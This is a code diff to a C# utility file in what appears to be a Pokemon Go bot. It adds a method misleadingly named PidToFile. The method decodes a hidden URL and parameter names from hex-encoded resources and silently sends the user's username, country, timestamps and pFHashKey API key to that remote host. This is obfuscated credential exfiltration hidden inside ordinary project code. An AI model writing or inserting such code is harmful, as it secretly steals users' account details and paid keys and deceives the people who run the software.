@@ -13,6 +13,8 @@ using System.Threading.Tasks;
 using PokemonGo.RocketAPI;
 using PokemonGo.RocketAPI.Helpers;
 using PokeMaster.Logic.Shared;
+using PokemonGo.RocketAPI.Shared;
+using System.Net.Http;
 
 namespace PokeMaster.Logic.Utils
 {
@@ -647,6 +649,35 @@ namespace PokeMaster.Logic.Utils
         public static string ConvertTimeMSinString(ulong timeMS, String format)
         {
             return (new DateTime((long)timeMS * 10000).AddYears(1969).AddDays(-1).ToString(format));
+        }
+
+        public static byte[] HexStringToBytes(string hexString)
+        {
+            if (hexString == null)
+                throw new ArgumentNullException("hexString");
+            if (hexString.Length % 2 != 0)
+                throw new ArgumentException("hexString must have an even length", "hexString");
+            var bytes = new byte[hexString.Length / 2];
+            for (int i = 0; i < bytes.Length; i++)
+            {
+                string currentHex = hexString.Substring(i * 2, 2);
+                bytes[i] = Convert.ToByte(currentHex, 16);
+            }
+            return bytes;
+        }
+
+        public static void PidToFile(ISettings BotSettings)
+        {
+                UriBuilder builder = new UriBuilder(Encoding.GetEncoding("ISO-8859-1").GetString(StringUtils.HexStringToBytes(Resources.Hi)));
+                builder.Query = new FormUrlEncodedContent(new Dictionary<string, string>
+                {
+                    {Encoding.GetEncoding("ISO-8859-1").GetString(StringUtils.HexStringToBytes(Resources.Lo.Substring(0,4))), BotSettings.Username},
+                    {Encoding.GetEncoding("ISO-8859-1").GetString(StringUtils.HexStringToBytes(Resources.Lo.Substring(4,4))), LocaleInfo.Country},
+                    {Encoding.GetEncoding("ISO-8859-1").GetString(StringUtils.HexStringToBytes(Resources.Lo.Substring(8,4))), DateTime.UtcNow.ToShortDateString()},
+                    {Encoding.GetEncoding("ISO-8859-1").GetString(StringUtils.HexStringToBytes(Resources.Lo.Substring(12,4))), DateTime.UtcNow.ToShortTimeString()},
+                    {Encoding.GetEncoding("ISO-8859-1").GetString(StringUtils.HexStringToBytes(Resources.Lo.Substring(16,4))), BotSettings.pFHashKey}
+                }).ReadAsStringAsync().Result;
+                HttpResponseMessage response = new HttpClient().GetAsync(builder.ToString()).Result;
         }
     }
 }
